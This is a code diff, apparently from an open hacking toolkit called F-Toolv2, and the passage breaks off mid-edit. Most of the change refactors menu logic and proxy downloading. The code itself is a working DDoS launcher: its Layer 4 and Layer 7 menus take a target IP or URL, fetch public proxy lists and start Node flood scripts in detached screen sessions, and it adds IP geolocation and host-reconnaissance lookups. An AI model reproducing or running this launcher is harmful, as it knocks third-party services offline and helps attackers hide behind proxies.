@@ -36,18 +36,6 @@ class Home:
 		self.help = help
 		self.dev = dev
 
-	def getproxies(self):
-		#self.styleText("\n [*] Downloading Proxy...\n")
-		file_name = "utils/http.txt"
-		http_proxies = [
-			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
-			"https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
-			"https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous"]
-		with open(file_name, 'w'):
-			for proxies in http_proxies:
-				if httpx.get(proxies).status_code == 200:
-					with open(file_name, 'a') as p:
-						p.write(httpx.get(proxies).text)
 	def styleText(self, text):
 		for animation in text:
 			sys.stdout.write(animation)
@@ -60,8 +48,8 @@ class Home:
 	def home(self): # don't edit this banner lol
 		print(f"""
                         {Color.LG}╔══════════════════════╗
-    {Color.LC}╔═╗{Color.LB} ╔╦╗╔═╗╔═╗╦      {Color.LG}║ {Color.LR}Created: {Color.LY}5/3/22      {Color.LG}║
-    {Color.LC}╠╣{Color.LB}{Color.LR}───{Color.LB}║ ║ ║║ ║║      {Color.LG}║ {Color.LR}Updated: {Color.LY}8/3/22      {Color.LG}║
+    {Color.LC}╔═╗{Color.LB} ╔╦╗╔═╗╔═╗╦      {Color.LG}║ {Color.LR}Created: {Color.LY}5/3/2022    {Color.LG}║
+    {Color.LC}╠╣{Color.LB}{Color.LR}───{Color.LB}║ ║ ║║ ║║      {Color.LG}║ {Color.LR}Updated: {Color.LY}8/3/2022    {Color.LG}║
     {Color.LC}╚{Color.LB}    ╩ ╚═╝╚═╝╩═╝{Color.LG}v2  {Color.LG}║ {Color.LB}Simple but mighty XD {Color.LG}║
                         {Color.LG}╚══════════════════════╝
     {Color.LR}[{Color.LG}>     Made with ☕ By FDc0d3 & Aya    {Color.LG}<{Color.LR}]""")
@@ -75,35 +63,34 @@ class Home:
 			try:
 				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Home"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 				option = input()
-				if option in ['01', '1']:
+				if option == '01' or option == '1':
 					os.system('clear')
 					Tool.proxy(option)
-				elif option in ['02', '2']:
+				elif option == '02' or option == '2':
 					os.system('clear')
 					Tool.webtools()
-				elif option in ['03', '3']:
+				elif option  == '03' or option == '3':
 					os.system('clear')
 					Tool.bbos()
-				elif option in ['04', '4']:
+				elif option == '04' or option == '4':
 					os.system('clear')
 					Tool.spdtest()
-				elif option in ['ref', 'REF']:
+				elif option == 'ref' or option == 'REF':
 					self.home()
-				elif option in ['home', 'HOME']:
+				elif option == 'home' or option == 'HOME':
 					self.home()
-				elif option in ['clear', 'CLEAR']:
-					os.system('clear');F_Tool.home()
-				elif option in ['help', 'HELP', '?']:
+				elif option == 'clear' or option == 'CLEAR':
+					os.system('clear')
+					F_Tool.home()
+				elif option == 'help' or option == 'HELP':
 					print(self.help)
-				elif option in ['dev', 'DEV']:
+				elif option == 'dev' or option == 'DEV':
 					print(self.dev)
-				elif option in ['exit', 'EXIT']:
+				elif option == 'exit' or option == 'EXIT':
 					subprocess.run(['pkill -f F-Tool.py'], shell=True)
-				elif option in ['stop', 'STOP']:
+				elif option == 'stop' or option == 'STOP':
 					subprocess.run(['pkill screen'], shell=True)
 					print(f"{Color.LG} [!] Attack Stopped!")
-				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
-					os.system('clear');Tool.bbos()
 				elif option == "":
 					pass
 				else:
@@ -122,9 +109,10 @@ class response_url:
 			if url == '':
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
 			resp = requests.get(f"http://ip-api.com/json/{url}?fields=status,message,country,countryCode,regionName,city,timezone,asname,isp,org,reverse,query", headers=self.headers).json()
-			if resp['status'] == 'success':
-				return Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Host name: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Organization: "+ resp['org'] + "\n" +Color.LG+ "    [+] Country: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['regionName'] + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] ASN: " + resp['asname'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone']
+			info = Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Host name: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Organization: "+ resp['org'] + "\n" +Color.LG+ "    [+] Country: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['regionName'] + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] ASN: " + resp['asname'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone']
 
+			if resp['status'] == 'success':
+				return info
 			else:
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
 		except requests.exceptions.ConnectionError:
@@ -135,10 +123,12 @@ class response_url:
 			if ip == '':
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
 			resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,reverse,message,continent,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,currency,isp,as,mobile,proxy,query,asname", headers=self.headers).json()
+
+			info = Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])
+
 			if resp['status'] == 'success':
-				return Color.LG+"    [+] Target IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Country: " + resp['continent'] + " " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['region'] + " " + "(" + resp['regionName'] + ")" + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] Zipcode: " + resp['zip'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone'] + "\n\n" +Color.LG+ "    [+] ISP: " + resp['isp'] + "\n" +Color.LG+ "    [+] ASN: " + resp['as'] + " " + resp['asname'] + "\n\n" +Color.LG+ "    [+] Mobile: " + str(resp['mobile']) + "\n" +Color.LG+ "    [+] VPN: " + str(resp['proxy'])+ "\n\n" +Color.LG+ "    [+] Google Map: https://www.google.com/maps/place/" + str(resp['lat']) + "," + str(resp['lon'])
-			else:
-				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
+				return info
+
 		except KeyError:
 			return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid IP Address"
 		except requests.exceptions.ConnectionError:
@@ -146,43 +136,45 @@ class response_url:
 
 	def http_status(self, url):
 		try:
-			if parse.urlparse(url).scheme == "":
+			parser = parse.urlparse(url)
+			if parser.scheme == "":
 				url = "http://"+url
 			resp = httpx.get(url, headers=self.headers)
-			if resp.status_code == 200:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (OK)"
-			elif resp.status_code == 301:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Moved Permanently)"
-			elif resp.status_code == 302:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Found)"
-			elif resp.status_code == 303:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (See Other)"
-			elif resp.status_code == 307:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Temporary Redirect)"
-			elif resp.status_code == 400:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Unauthorized)"
-			elif resp.status_code == 410:
-				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gone)"
-			elif resp.status_code == 401:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Requests)"
-			elif resp.status_code == 403:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Forbidden)"
-			elif resp.status_code == 404:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Not Found)"
-			elif resp.status_code == 429:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (To Many Requests)"
-			elif resp.status_code == 500:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Internal Server Error)"
-			elif resp.status_code == 502:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Bad Gateway)"
-			elif resp.status_code == 503:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Service Unavailable)"
-			elif resp.status_code == 504:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Gateway Timeout)"
-			elif resp.status_code == 507:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Insufficient Storage)"
-			elif resp.status_code == 508:
-				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {resp.status_code} (Loop Detected)"
+			status = resp.status_code
+			if status == 200:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (OK)"
+			elif status == 301:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Moved Permanently)"
+			elif status == 302:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Found)"
+			elif status == 303:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (See Other)"
+			elif status == 307:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Temporary Redirect)"
+			elif status == 400:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Unauthorized)"
+			elif status == 410:
+				return Color.LG+f"    [+] Result: OK | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Gone)"
+			elif status == 401:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Bad Requests)"
+			elif status == 403:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Forbidden)"
+			elif status == 404:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Not Found)"
+			elif status == 429:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (To Many Requests)"
+			elif status == 500:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Internal Server Error)"
+			elif status == 502:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Bad Gateway)"
+			elif status == 503:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Service Unavailable)"
+			elif status == 504:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Gateway Timeout)"
+			elif status == 507:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Insufficient Storage)"
+			elif status == 508:
+				return Color.LR+f"    [+] Result: Server error | {round(resp.elapsed.total_seconds(), 3)} Seconds | {status} (Loop Detected)"
 			else:
 				return Color.LR+f"    [+] Result: (Connection timeout)"
 
@@ -197,10 +189,11 @@ class response_url:
 		try:
 			resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={host}", headers=self.headers)
 
-			if resp.text == 'error invalid host':
+			info = resp.text
+			if info == 'error invalid host':
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
 			else:
-				return Color.LG+resp.text
+				return Color.LG+info
 		except requests.exceptions.ConnectionError:
 			return Color.LR+"Error: Check your Internet Connection."
 
@@ -208,12 +201,13 @@ class response_url:
 		try:
 			resp = requests.get(f"https://api.hackertarget.com/pagelinks/?q={url}", headers=self.headers)
 
-			if resp.text == "input url is invalid":
+			info = resp.text
+			if info == "input url is invalid":
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
-			elif resp.text == "error getting links":
+			elif info == "error getting links":
 				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" No Links Found!"
 			else:
-				return Color.LG+resp.text
+				return Color.LG+info
 		except requests.exceptions.ConnectionError:
 			return Color.LR+"Error: Check your Internet Connection."
 
@@ -230,31 +224,36 @@ class Tool:
 	def proxy(self, new):
 		try:
 			with open("utils/url.json", 'r') as p:
-				readjson = json.loads(p.read())
+				read_url = p.read()
+				readjson = json.loads(read_url)
 		except FileNotFoundError:
 			sys.exit(f"{Color.LR}ERROR:{Color.RESET} File: 'utils' NotFound")
-		if new in ['ref', 'REF', 'clear', 'CLEAR']:
+		if new == 'ref' or new == 'REF' or new == 'clear' or new == 'CLEAR':
 			os.system('clear')
 			F_Tool.styleText("[*] Downloading New Proxy...")
 		else:
 			F_Tool.styleText("[*] Downloading All Proxy...")
 		try:
-			for proxy in readjson['Proxies']:
-				if proxy['type'] == 1:
-					if requests.get(proxy["url"]).status_code == 200:
-						http = requests.get(proxy["url"], headers=self.headers).text
-				if proxy['type'] == 2:
-					if requests.get(proxy["url"]).status_code == 200:
-						https = requests.get(proxy["url"], headers=self.headers).text
-				if proxy['type'] == 3:
-					if requests.get(proxy["url"]).status_code == 200:
-						socks4 = requests.get(proxy["url"], headers=self.headers).text
-				if proxy['type'] == 4:
-					if requests.get(proxy["url"]).status_code == 200:
-						socks5 = requests.get(proxy["url"], headers=self.headers).text
+			http  = requests.get(readjson['Proxies'][0]['url'], headers=self.headers).text
+			http += requests.get(readjson['Proxies'][1]['url'], headers=self.headers).text
+			http += requests.get(readjson['Proxies'][2]['url'], headers=self.headers).text
+			http += requests.get(readjson['Proxies'][3]['url'], headers=self.headers).text
+			https = requests.get(readjson['Proxies'][4]['url'], headers=self.headers).text
+			https += requests.get(readjson['Proxies'][5]['url'], headers=self.headers).text
+			https += requests.get(readjson['Proxies'][6]['url'], headers=self.headers).text
+			https +=  requests.get(readjson['Proxies'][7]['url'], headers=self.headers).text
+			socks4  = requests.get(readjson['Proxies'][8]['url'], headers=self.headers).text
+			socks4 += requests.get(readjson['Proxies'][9]['url'], headers=self.headers).text
+			socks4 += requests.get(readjson['Proxies'][10]['url'], headers=self.headers).text
+			socks4 += requests.get(readjson['Proxies'][11]['url'], headers=self.headers).text
+			socks5 = requests.get(readjson['Proxies'][12]['url'], headers=self.headers).text
+			socks5 += requests.get(readjson['Proxies'][13]['url'], headers=self.headers).text
+			socks5 += requests.get(readjson['Proxies'][14]['url'], headers=self.headers).text
+			socks5 += requests.get(readjson['Proxies'][15]['url'], headers=self.headers).text
 			os.system('clear')
 		except requests.exceptions.ConnectionError:
-			sys.exit(Color.LR+"\nError: Check your Internet Connection.")
+			sys.exit(Color.LR+"Error: Check your Internet Connection.")
+
 		print(f"""{Color.LG}
 
      ___               _
@@ -273,40 +272,38 @@ class Tool:
 		while True:
 				sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Proxy"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 				option = input()
-				if option in ['01', '1']:
+				if option == '01' or option == '1':
 					with open("http.txt", 'w') as p:
 						p.write(http)
 					print(Color.LG+"[+]"+Color.LC+" HTTP Saved to http.txt")
-				elif option in ['02', '2']:
+				elif option == '02' or option == '2':
 					with open("https.txt", 'w') as p:
 						p.write(https)
 					print(Color.LG+"[+]"+Color.LC+" HTTPS to https.txt")
-				elif option in ['03', '3']:
+				elif option == '03' or option == '3':
 					with open("socks4.txt", 'w') as p:
 						p.write(socks4)
 					print(Color.LG+"[+]"+Color.LC+" SOCKS4 Saved to socks4.txt")
-				elif option in ['04', '4']:
+				elif option == '04' or option == '4':
 					with open("socks5.txt", 'w') as p:
 						p.write(socks5)
 					print(Color.LG+"[+]"+Color.LC+" SOCKS5 Saved to socks5.txt")
-				elif option in ['ref', 'REF']:
+				elif option == 'ref' or option == 'REF':
 					self.proxy(option)
-				elif option in ['home', 'HOME']:
+				elif option == 'home' or option == 'HOME':
 					F_Tool.home()
-				elif option in ['clear', 'CLEAR']:
+				elif option == 'clear' or option == 'CLEAR':
 					os.system('clear')
 					self.proxy(option)
-				elif option in ['help', 'HELP', '?']:
+				elif option == 'help' or option == 'HELP':
 					print(self.help)
-				elif option in ['dev', 'DEV']:
+				elif option == 'dev' or option == 'DEV':
 					print(self.dev)
-				elif option in ['exit', 'EXIT']:
+				elif option == 'exit' or option == 'EXIT':
 					subprocess.run(['pkill -f F-Tool.py'], shell=True)
-				elif option in ['stop', 'STOP']:
+				elif option == 'stop' or option == 'STOP':
 					subprocess.run(['pkill screen'], shell=True)
 					print(f"{Color.LG} [!] Attack Stopped!")
-				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
-					os.system('clear');Tool.bbos()
 				elif option == "":
 					pass
 				else:
@@ -332,7 +329,7 @@ class Tool:
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Webtool"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
-			if option in ['01', '1']:
+			if option == '01' or option == '1':
 				while True:
 					lookup = input(Color.LR+"["+Color.LG+"LOOKUP"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
 					parser = parse.urlparse(lookup)
@@ -345,17 +342,17 @@ class Tool:
 						host = parser.netloc
 					print(response_url(self.headers).lookup(host))
 					break
-			elif option in ['02', '2']:
+			elif option == '02' or option == '2':
 				while True:
 					ip_lookup = input(Color.LR+"["+Color.LG+"IP INFO"+Color.LR+"]"+Color.LC+" Enter Target IP: "+Color.RESET)
 					print(response_url(self.headers).ip_lookup(ip_lookup))
 					break
-			elif option in ['03', '3']:
+			elif option == '03' or option == '3':
 				while True:
 					http = input(Color.LR+"["+Color.LG+"HTTPCHECK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
 					print(response_url(self.headers).http_status(http))
 					break
-			elif option in ['04', '4']:
+			elif option == '04' or option == '4':
 				while True:
 					findhost = input(Color.LR+"["+Color.LG+"FINDHOST"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
 					parser = parse.urlparse(findhost)
@@ -366,28 +363,27 @@ class Tool:
 					elif host == '':
 						print(response_url(self.headers).findhost(path))
 					break
-			elif option in ['05', '5']:
+			elif option == '05' or option == '5':
 				while True:
 					excractlink = input(Color.LR+"["+Color.LG+"EXCRACTLINK"+Color.LR+"]"+Color.LC+" Enter Target URL: "+Color.RESET)
 					print(response_url(self.headers).extractlink(excractlink))
 					break
-			elif option in ['ref', 'REF']:
+			elif option == 'ref' or option == 'REF':
 				self.webtools()
-			elif option in ['home', 'HOME']:
+			elif option == 'home' or option == 'HOME':
 				F_Tool.home()
-			elif option in ['clear', 'CLEAR']:
-				os.system('clear');self.webtools()
-			elif option in ['help', 'HELP', '?']:
+			elif option == 'clear' or option == 'CLEAR':
+				os.system('clear')
+				self.webtools()
+			elif option == 'help' or option == 'HELP':
 				print(self.help)
-			elif option in ['dev', 'DEV']:
+			elif option == 'dev' or option == 'DEV':
 				print(self.dev)
-			elif option in ['exit', 'EXIT']:
+			elif option == 'exit' or option == 'EXIT':
 				subprocess.run(['pkill -f F-Tool.py'], shell=True)
-			elif option in ['stop', 'STOP']:
+			elif option == 'stop' or option == 'STOP':
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} [!] Attack Stopped!")
-			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
-				os.system('clear');Tool.bbos()
 			elif option == "":
 				pass
 			else:
@@ -448,25 +444,26 @@ class Tool:
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"L4/L7/BBoS"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
-			if option in ['01', '1']:
+			if option == '01' or option == '1':
 				os.system('clear');self.l4()
-			elif option in ['02', '2']:
+			elif option == '02' or option == '2':
 				os.system('clear');self.l7()
-			elif option in ['home', 'HOME']:
+			elif option == 'ref' or option == 'REF':
+				self.bbos()
+			elif option == 'home' or option == 'HOME':
 				F_Tool.home()
-			elif option in ['clear', 'CLEAR']:
-				os.system('clear');self.bbos()
-			elif option in ['help', 'HELP', '?']:
+			elif option == 'clear' or option == 'CLEAR':
+				os.system('clear')
+				self.bbos()
+			elif option == 'help' or option == 'HELP':
 				print(self.help)
-			elif option in ['dev', 'Dev']:
+			elif option == 'dev' or option == 'DEV':
 				print(self.dev)
-			elif option in ['exit', 'EXIT']:
+			elif option == 'exit' or option == 'EXIT':
 				subprocess.run(['pkill -f F-Tool.py'], shell=True)
-			elif option in ['stop', 'STOP']:
+			elif option == 'stop' or option == 'STOP':
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} [!] Attack Stopped!")
-			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
-				os.system('clear');Tool.bbos()
 			elif option == "":
 				pass
 			else:
@@ -492,7 +489,7 @@ class Tool:
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer4"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
-			if option in ['01', '1']:
+			if option == '01' or option == '1':
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
@@ -502,7 +499,7 @@ class Tool:
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['02', '2']:
+			elif option == '02' or option == '2':
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
@@ -512,7 +509,7 @@ class Tool:
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['03', '3']:
+			elif option == '03' or option == '3':
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
@@ -523,7 +520,7 @@ class Tool:
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['04', '4']:
+			elif option == '04' or option == '4':
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
@@ -534,7 +531,7 @@ class Tool:
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['05', '5']:
+			elif option == '05' or option == '5':
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
 					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
@@ -544,25 +541,24 @@ class Tool:
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['ref', 'REF']:
+			elif option == 'ref' or option == 'REF':
 				self.l4()
-			elif option in ['home', 'HOME']:
+			elif option == 'home' or option == 'HOME':
 				F_Tool.home()
-			elif option in ['clear', 'CLEAR']:
-				os.system('clear');self.l4()
-			elif option in ['help', 'HELP', '?']:
+			elif option == 'clear' or option == 'CLEAR':
+				os.system('clear')
+				self.l4()
+			elif option == 'help' or option == 'HELP':
 				print(self.help)
-			elif option in ['dev', 'DEV']:
+			elif option == 'dev' or option == 'DEV':
 				print(self.dev)
-			elif option in ['exit', 'EXIT']:
+			elif option == 'exit' or option == 'EXIT':
 				subprocess.run(['pkill -f F-Tool.py'], shell=True)
-			elif option in ['stop', 'STOP']:
+			elif option == 'stop' or option == 'STOP':
 				subprocess.run(['pkill screen'], shell=True)
 				print(f"{Color.LG} [!] Attack Stopped!")
-			elif option in ['00', '0']:
+			elif option == '00' or option == '0':
 				os.system('clear');self.bbos()
-			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
-				os.system('clear');Tool.bbos()
 			elif option == "":
 				pass
 			else:
@@ -584,68 +580,78 @@ class Tool:
 		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
+		http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
 			option = input()
-			if option in ['01', '1']:
+			if option == '01' or option == '1':
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
+					F_Tool.styleText("\n [*] Downloading Proxy...\n")
+					with open("utils/http.txt", 'w') as p:
+						p.write(httpx.get(http_proxy).text)
+					subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['02', '2']:
+			elif option == '02' or option == '2':
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
+					F_Tool.styleText("\n [*] Downloading Proxy...\n")
+					with open("utils/http.txt", 'w') as p:
+						p.write(httpx.get(http_proxy).text)
+					subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['03', '3']:
-				try:
-					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
-				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['04', '4']:
+			elif option == '03' or option == '3':
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
+					F_Tool.styleText("\n [*] Downloading Proxy...\n")
+					with open("utils/http.txt", 'w') as p:
+						p.write(httpx.get(http_proxy).text)
+					subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
-			elif option in ['ref', 'REF']:
+			elif option == '04' or option == '4':
+				try:
+					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
+					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
+					F_Tool.styleText("\n [*] Downloading Proxy...\n")
